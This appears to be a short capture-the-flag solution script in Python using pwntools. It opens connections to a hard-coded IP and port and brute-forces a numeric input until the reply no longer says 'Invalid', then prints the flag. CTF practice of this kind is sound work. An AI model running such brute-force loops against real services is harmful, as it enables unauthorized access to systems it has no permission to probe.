from pwn import *

host, port = "157.66.55.21", "30001"

for i in range(4199180, 0xFFFFFF):
    conn = remote(host, port)

    conn.recvuntil(b"ur choice: ")
    conn.sendline(f"{i}".encode())
    conn.recvline()
    response = conn.recvline()
    if b"Invalid" not in response:
        print(i)
        print(f"Flag: {response}")
        break

    conn.close()
